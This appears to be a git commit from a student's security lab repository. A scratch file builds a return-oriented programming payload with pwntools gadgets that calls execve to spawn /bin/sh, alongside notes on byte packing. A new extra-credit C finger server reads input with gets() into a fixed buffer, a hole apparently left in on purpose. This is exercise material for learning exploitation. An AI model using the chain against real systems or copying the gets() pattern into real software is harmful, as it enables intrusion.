daf2e6291525cf7bba94ae5792266f15e560bced
KieraConway <66643785+KieraConway@users.noreply.github.com>
2023-10-28 18:35:15 -0700

    Setup lab 7 and extra credit

--- Lab06/6-3/scratch.py
+++ Lab06/6-3/scratch.py
@@ -1,3 +1,17 @@
++---------+------+------+------+------+------+------+
+| syscall | arg0 | arg1 | arg2 | arg3 | arg4 | arg5 |
++---------+------+------+------+------+------+------+
+|   %rax  | %rdi | %rsi | %rdx | %rcx | %r8  | %r9  |
++---------+------+------+------+------+------+------+
+|   0x3b  | file |   0  |   0  | %rcx | %r8  | %r9  |
++---------+------+------+------+------+------+------+
+
+0x00007ffdc0266de0
+
+# POP_RDI : Before calling the "pop rdi; ret" gadget,  arrange the stack so that the address of "/bin/sh" is on top of it. This could be done by pushing the address onto the stack.
+# When the "pop rdi; ret" gadget is executed, it pops the value from the stack into the RDI register. Since you've previously placed the address of "/bin/sh" on the stack, it will be loaded into RDI.
+
+
 payload = SHELL_FILE = p64(0x68732f6e69622f)              # Set execve() filename: /bin/bash/
 
 
@@ -11,8 +25,6 @@ payload += BUFF_FILL
 
 
 
-payload += POP_RDI              #POP_RDI = p64(0x004018e2)              ## Set Gadget 1: pop rdi; ret
-payload += SHELL_FILE           #SHELL_FILE = p64(0x68732f6e69622f)     ## Set execve() filename: /bin/bash/  
 
 #
 #   POP_RAX:        Pointer to 'pop rax; ret' gadget to load '59' (SYS_EXECVE) into RAX register for syscall
@@ -20,6 +32,11 @@ payload += SHELL_FILE           #SHELL_FILE = p64(0x68732f6e69622f)     ## Set e
 $
 payload += POP_RAX              #POP_RAX = p64(0x0045a137)      ## Set Gadget 2: pop rax; ret
 payload += SYS_EXECVE           #SYS_EXECVE = p64(59)           ## Set Sys Call 1: execve (59)    
+
+
+
+payload += POP_RDI              #POP_RDI = p64(0x004018e2)              ## Set Gadget 1: pop rdi; ret
+payload += SHELL_FILE           #SHELL_FILE = p64(0x68732f6e69622f)     ## Set execve() filename: /bin/bash/  
 
 #
 #   POP_RSI:        Pointer to 'pop rsi; ret' gadget to load '0' into RSI register for execve() argv
@@ -42,7 +59,37 @@ payload += EXECVE_ENVP          #EXECVE_ENVP = p64(0)		    ## Set execve() envp:
 payload += SYS_CALL             #SYS_CALL = p64(0x4012e3)       ## Set Sys Call address
 
 
-
+''' Prepare Payload '''
+#
+# Payload Format:
+#   BUFF_FILL:      Filler for Buffer
+#
+#   POP_RAX:        Pointer to a 'pop rax; ret' gadget to load RAX register with SYS_EXECVE (59)
+#   SYS_EXECVE:     The syscall number (59) for the sys_execve syscall (64-bit).
+#
+#   POP_RDI:        Pointer to a 'pop rdi; ret' gadget to load RDI register with "/bin/sh"
+#   EXECVE_FILE:    Pointer to the string '/bin/sh/' for use as file parameter in sys_execve()
+#
+#   POP_RSI:        Pointer to a 'pop rsi; ret' gadget to load RSI register with '0'
+#   EXECVE_ARGV:    Null Value (0) for use as argv parameter in sys_execve()
+#
+#   POP_RDX:        Pointer to a 'pop rdx; ret' gadget to load RDX register with '0'
+#   EXECVE_ENVP:    Null Value (0) for use as envp parameter in sys_execve()
+#
+#   SYS_CALL:       Pointer to 'syscall' to execute sys_execve()
+#
+
+payload = BUFF_FILL + \
+          POP_RAX + \
+          SYS_EXECVE + \
+          POP_RDI + \
+          EXECVE_FILE + \
+          POP_RSI + \
+          EXECVE_ARGV + \
+          POP_RDX + \
+          EXECVE_ENVP + \
+          SYS_CALL
+
 
 
 
@@ -52,3 +99,64 @@ payload += 0x68732f6e69622f
 HHIIIIIIIIJJJJJJJJKKKKKKKKLLLLLLLLMMMMMMMMNNNNNNNNOOOOOOOOPPPP
 
 login+53
+
+
+=============================
+
+
+FROM BIN TO HEX
+
+u = make_unpacker(64, endian='little', sign='unsigned')              # Create Unpacker
+pack = b'\x0b\x00\x00\x00\x12\x00\x00\x00'
+d = u(pack)
+hex(d)
+>> '0x140000000b'
+
+
+
+FROM HEX TO BIN
+from pwn import *
+
+# Integer value you want to pack
+value = 0x140000000b
+
+# Use p64 to pack the integer value into a binary string
+#b'\x0b\x00\x00\x00\x14\x00\x00\x00'
+
+packed_value = p64(value)
+
+# Convert the binary string to a hexadecimal representation
+hex_representation = enhex(packed_value)
+
+print(f' original value: {value}\npacked value: {packed_value}\nhex representation:0x{hex_representation}')
+
+
+
+
+
+value = 0x0000000000000001
+packed_value = p64(value)
+
+0xfffffffffffffffc
+
+b'\x01\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00'
+
+
+
+
+i = 11
+SET_LENGTH = 20
+
+pv = p64((SET_LENGTH << 32) | i)
+
+b'\x0b\x00\x00\x00\x14\x00\x00\x00'
+
+	for (i=0; i<SET_LENGTH; i++) {
+
+		if (nums[i] > largest)
+			largest = nums[i];
+
+		if (nums[i] < smallest)
+			smallest = nums[i];
+
+	}
---
+++ LabEC/EC1_easy/ec1.c
@@ -0,0 +1,104 @@
+ /*
+  * Finger server.
+  */
+ #include <sys/types.h>
+ #include <sys/wait.h>
+ #include <netinet/in.h>
+ 
+ #include <stdio.h>
+ #include <ctype.h>
+ #include <stdlib.h>
+ #include <unistd.h>
+ 
+#include <signal.h>
+
+void sig_handler(int signum) {
+
+	printf("Timeout\n");
+	exit(0);
+
+}
+
+void init() {
+
+	alarm(60);
+	signal(SIGALRM, sig_handler);
+
+	setvbuf(stdin, NULL, _IONBF, 0);
+	setvbuf(stdout, NULL, _IONBF, 0);
+	setvbuf(stderr, NULL, _IONBF, 0);
+
+	chdir(getenv("HOME"));
+
+}
+ 
+ int fatal(char *prog, char *s)
+ {
+ 
+     fprintf(stderr, "%s: ", prog);
+     perror(s);
+     exit(1);
+ }
+
+ int main(int argc, char *argv[])
+ {
+     register char *sp;
+     char line[512];
+ //    struct sockaddr sin;
+     int i, p[2], pid, status;
+     FILE *fp;
+     char *av[4];
+ 
+     init();
+ 
+ //    i = sizeof (sin);
+ //    if (getpeername(0, &sin, &i) < 0)
+ //        fatal(argv[0], "getpeername");
+     line[0] = '\0';
+     gets(line);
+     sp = line;
+     av[0] = "finger";
+     i = 1;
+     while (1) {
+         while (isspace(*sp))
+             sp++;
+         if (!*sp)
+             break;
+         if (*sp == '/' && (sp[1] == 'W' || sp[1] == 'w')) {
+             sp += 2;
+             av[i++] = "-l";
+         }
+         if (*sp && !isspace(*sp)) {
+             av[i++] = sp;
+             while (*sp && !isspace(*sp))
+                 sp++;
+             *sp = '\0';
+         }
+     }
+     av[i] = 0;
+     if (pipe(p) < 0)
+         fatal(argv[0], "pipe");
+     if ((pid = fork()) == 0) {
+         close(p[0]);
+         if (p[1] != 1) {
+             dup2(p[1], 1);
+             close(p[1]);
+         }
+         execv("/usr/bin/finger", av);
+         _exit(1);
+     }
+     if (pid == -1)
+         fatal(argv[0], "fork");
+     close(p[1]);
+     if ((fp = fdopen(p[0], "r")) == NULL)
+         fatal(argv[0], "fdopen");
+     while ((i = getc(fp)) != EOF) {
+         if (i == '\n')
+             putchar('\r');
+         putchar(i);
+     }
+     fclose(fp);
+     while ((i = wait(&status)) != pid && i != -1)
+         ;
+     return(0);
+ }
